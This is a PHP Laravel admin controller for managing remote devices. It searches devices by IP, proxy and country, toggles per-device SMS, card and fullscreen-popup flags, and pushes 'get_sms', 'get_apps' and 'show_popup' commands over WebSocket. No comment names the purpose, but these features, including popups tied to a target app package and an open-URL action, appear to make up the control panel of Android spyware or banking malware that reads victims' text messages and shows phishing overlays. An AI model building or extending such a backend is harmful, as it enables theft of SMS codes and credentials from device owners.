<?php

namespace App\Http\Controllers\Admin;

use App\Events\DeviceListUpdateEvent;
use App\Events\DeviceMessageEvent;
use App\Http\Controllers\Controller;
use App\Models\Device;
use App\Service\CountryService;
use Illuminate\Http\Request;

class DeviceController extends Controller
{
    /**
     * 设备列表
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function list(Request $request)
    {
        $request->validate([
            'page' => 'required|int',
            'limit' => 'required|int',
            'device_number' => 'nullable|string',
            'language' => 'nullable|string',
            'country' => 'nullable|string',
            'ip' => 'nullable|string',
            'brand' => 'nullable|string',
            'proxy' => 'nullable|string',
            'tags' => 'nullable|string',
            'appVersion' => 'nullable|string',
            'app_channel' => 'nullable|string',
        ]);

        $page = $request->get('page', 1);
        $limit = $request->get('limit', 20);
        $offset = ($page - 1) * $limit;

        $model = Device::query();

        // 按设备号搜索
        if (!empty($request->device_number)) {
            $model->where('device_number', 'like', '%' . $request->device_number . '%');
        }

        // 按语言搜索
        if (!empty($request->language)) {
            $model->where('language', 'like', '%' . $request->language . '%');
        }

        // 按国家搜索
        if (!empty($request->country)) {
            $countryCodes = CountryService::getCountryCodesByName($request->country);
            if (!empty($countryCodes)) {
                $model->where(function($query) use ($request, $countryCodes) {
                    $query->whereIn('country', $countryCodes)
                          ->orWhere('country', 'like', '%' . $request->country . '%');
                });
            } else {
                $model->where('country', 'like', '%' . $request->country . '%');
            }
        }

        // 按IP搜索
        if (!empty($request->ip)) {
            $model->where('ip', 'like', '%' . $request->ip . '%');
        }

        // 按品牌搜索
        if (!empty($request->brand)) {
            $model->where('brand', 'like', '%' . $request->brand . '%');
        }

        // 按代理搜索
        if (!empty($request->proxy)) {
            $model->where('proxy', 'like', '%' . $request->proxy . '%');
        }

        // 按标签搜索
        if (!empty($request->tags)) {
            $model->where('tags', 'like', '%' . $request->tags . '%');
        }

        // 按版本搜索
        if (!empty($request->appVersion)) {
            $model->where('appVersion', 'like', '%' . $request->appVersion . '%');
        }

        // 按渠道搜索
        if (!empty($request->app_channel)) {
            $model->where('app_channel', 'like', '%' . $request->app_channel . '%');
        }

        $count = $model->count();
        $list = $model->offset($offset)
            ->limit($limit)
            ->orderBy('id', 'desc')
            ->get()
            ->toArray();

        // 将国家代码转换为中文名称
        $list = CountryService::convertCountryListToName($list);

        return $this->success(['total_num' => $count, 'list' => $list]);
    }

    /**
     * 获取指定设备
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function info(Request $request)
    {
        $request->validate([
            'id' => 'required|int'
        ]);

        $info = Device::query()
            ->where('id', $request->id)
            ->first();

        if (empty($info)) {
            return $this->fail(404, '设备不存在');
        }

        $infoArray = $info->toArray();
        // 将国家代码转换为中文名称
        $infoArray = CountryService::convertCountryToName($infoArray);

        return $this->success($infoArray);
    }

    /**
     * 更新设备信息
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function update(Request $request)
    {
        $request->validate([
            'id' => 'required|int',
            'has_card' => 'nullable|int|in:0,1',
            'has_sms' => 'nullable|int|in:0,1',
            'install_time_distance' => 'nullable|int',
            'screen_interval_time' => 'nullable|int',
            'has_screen_popup_card' => 'nullable|int|in:0,1',
            'has_fullscreen_mode' => 'nullable|int|in:0,1',
            'tags' => 'nullable|string|max:200',
        ]);

        $device = Device::query()->find($request->id);
        if (empty($device)) {
            return $this->fail(404, '设备不存在');
        }

        $data = [];
        if ($request->has('has_card')) {
            $data['has_card'] = $request->has_card;
        }
        if ($request->has('has_sms')) {
            $data['has_sms'] = $request->has_sms;
        }
        if ($request->has('install_time_distance')) {
            $data['install_time_distance'] = $request->install_time_distance;
        }
        if ($request->has('screen_interval_time')) {
            $data['screen_interval_time'] = $request->screen_interval_time;
        }
        if ($request->has('has_screen_popup_card')) {
            $data['has_screen_popup_card'] = $request->has_screen_popup_card;
        }
        if ($request->has('has_fullscreen_mode')) {
            $data['has_fullscreen_mode'] = $request->has_fullscreen_mode;
        }
        // tags 字段：如果请求中包含该字段，都进行更新
        // 检查请求中是否包含 tags 键（无论值是什么）
        if ($request->has('tags') || array_key_exists('tags', $request->all())) {
            $tagsValue = $request->input('tags');
            // 如果输入为空字符串或 null，保存为 null（数据库字段是 nullable）
            $data['tags'] = ($tagsValue === '' || $tagsValue === null) ? null : $tagsValue;
        }

        $device->update($data);
        // 确保 updated_at 字段被更新
        $device->touch();

        // 推送设备更新消息（已禁用）
        // event(new DeviceMessageEvent($device->device_number, 'device_update', [
        //     'action' => 'admin_updated',
        //     'device_id' => $device->id,
        //     'updated_fields' => array_keys($data),
        //     'device_data' => $device->toArray(),
        // ]));

        // 推送设备列表更新消息（管理员使用）（已禁用）
        // event(new DeviceListUpdateEvent($device->toArray(), 'updated'));

        return $this->success($device->toArray());
    }

    /**
     * 推送消息到指定设备
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function pushMessage(Request $request)
    {
        $request->validate([
            'device_number' => 'required|string',
            'type' => 'required|string|in:get_sms,get_apps,show_popup',
            'data' => 'nullable|array',
            'data.target_app' => 'required_if:type,show_popup|string',
            'data.title' => 'required_if:type,show_popup|string',
            'data.content' => 'required_if:type,show_popup|string',
            'data.action_type' => 'required_if:type,show_popup|string|in:open_app,open_url',
            'data.target_url' => 'required_if:data.action_type,open_url|string|url',
        ]);

        // 验证设备是否存在
        $device = Device::query()
            ->where('device_number', $request->device_number)
            ->first();

        if (empty($device)) {
            return $this->fail(404, '设备不存在');
        }

        // 根据类型设置默认数据
        $data = $request->data ?? [];
        $data['isfull'] = '1';
        switch ($request->type) {
            case 'get_sms':
                // 获取短信
                break;
            case 'get_apps':
                // 获取应用列表
                break;
            case 'show_popup':
                // 弹出信息，验证必填字段
                if (empty($data['target_app'])) {
                    return $this->fail(400, '弹出信息需要提供 target_app（目标APP包名）');
                }
                if (empty($data['title']) || empty($data['content'])) {
                    return $this->fail(400, '弹出信息需要提供 title 和 content');
                }
                // 验证跳转目标类型（必填）
                if (empty($data['action_type']) || !in_array($data['action_type'], ['open_app', 'open_url'])) {
                    return $this->fail(400, 'action_type 必须选择 open_app 或 open_url');
                }
                // 根据跳转类型验证对应参数
                if ($data['action_type'] === 'open_app') {
                    // 打开APP时，target_app已经在上面验证了
                } elseif ($data['action_type'] === 'open_url') {
                    if (empty($data['target_url'])) {
                        return $this->fail(400, '打开网页时必须提供 target_url（目标URL）');
                    }
                }
                break;
        }
        
        // 检查设备是否在线
        $isOnline = \App\Services\WebSocketPushService::isDeviceOnline($request->device_number);
        if (!$isOnline) {
            return $this->fail(400, '设备不在线，无法推送消息');
        }

        // 推送消息
        $result = \App\Services\WebSocketPushService::pushToDevice(
            $request->device_number,
            $request->type,
            $data
        );

        if (!$result) {
            return $this->fail(500, '推送消息失败，请检查 WebSocket 服务是否正常运行');
        }

        return $this->success([
            'device_number' => $request->device_number,
            'type' => $request->type,
            'message' => '消息推送成功',
        ]);
    }

    /**
     * 获取在线设备数量
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function onlineCount()
    {
        $count = \App\Services\WebSocketPushService::getOnlineDeviceCount();
        
        return $this->success([
            'online_count' => $count,
            'updated_at' => now()->toDateTimeString()
        ]);
    }

    /**
     * 获取 WebSocket 连接状态（调试用）
     */
    public function getWebSocketStatus()
    {
        try {
            $connections = \App\WebSocket\WebSocketHandler::getConnections();
            $status = [
                'total_connections' => count($connections),
                'connections' => [],
                'all_channels' => [],
            ];

            foreach ($connections as $fd => $connection) {
                $channels = $connection['channels'] ?? [];
                $status['connections'][] = [
                    'fd' => $fd,
                    'channels' => $channels,
                    'channel_count' => count($channels),
                ];
                $status['all_channels'] = array_merge($status['all_channels'], $channels);
            }

            $status['all_channels'] = array_unique($status['all_channels']);
            $status['all_channels'] = array_values($status['all_channels']);

            // 检查设备在线状态
            $devices = \App\Models\Device::query()
                ->select('device_number')
                ->limit(10)
                ->get();

            $deviceStatus = [];
            foreach ($devices as $device) {
                $channel = 'device.' . $device->device_number;
                $isOnline = \App\WebSocket\WebSocketHandler::isDeviceOnline($channel);
                $deviceStatus[] = [
                    'device_number' => $device->device_number,
                    'channel' => $channel,
                    'is_online' => $isOnline,
                ];
            }

            $status['device_status'] = $deviceStatus;

            return $this->success($status);
        } catch (\Exception $e) {
            return $this->fail(500, '获取状态失败: ' . $e->getMessage());
        }
    }
}

